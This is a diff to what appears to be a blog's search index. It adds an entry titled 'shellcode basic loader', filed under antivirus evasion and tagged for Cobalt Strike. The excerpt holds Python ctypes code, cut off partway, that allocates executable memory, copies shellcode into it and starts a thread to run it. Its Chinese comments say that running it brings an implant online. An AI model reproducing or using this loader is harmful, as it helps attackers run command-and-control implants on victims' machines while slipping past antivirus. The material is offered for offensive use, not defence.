@@ -202,4 +202,10 @@ var store = [{
         "tags": ["cobaltstrike"],
         "url": "/antivirus-evasion/malleable/",
         "teaser": null
+      },{
+        "title": "shellcode basic loader",
+        "excerpt":"shellcode basic loader Python 直接用python运行即可上线 import ctypes VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc RtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory CreateThread = ctypes.windll.kernel32.CreateThread WaitForSingleObject = ctypes.windll.kernel32.WaitForSingleObject buf = b\"\" sc = bytearray(buf) VirtualAlloc.restype = ctypes.c_uint64 k = VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(sc)), 0x1000 | 0x2000, 0x40) #申请内存 buf = (ctypes.c_char * len(sc)).from_buffer(sc) #将sc指向指针 RtlMoveMemory(ctypes.c_void_p(k), buf, ctypes.c_int(len(sc))) #复制sc进申请的内存中 h = CreateThread(ctypes.c_int(0),...","categories": ["antivirus-evasion"],
+        "tags": ["cobaltstrike"],
+        "url": "/antivirus-evasion/loader/",
+        "teaser": null
       }]
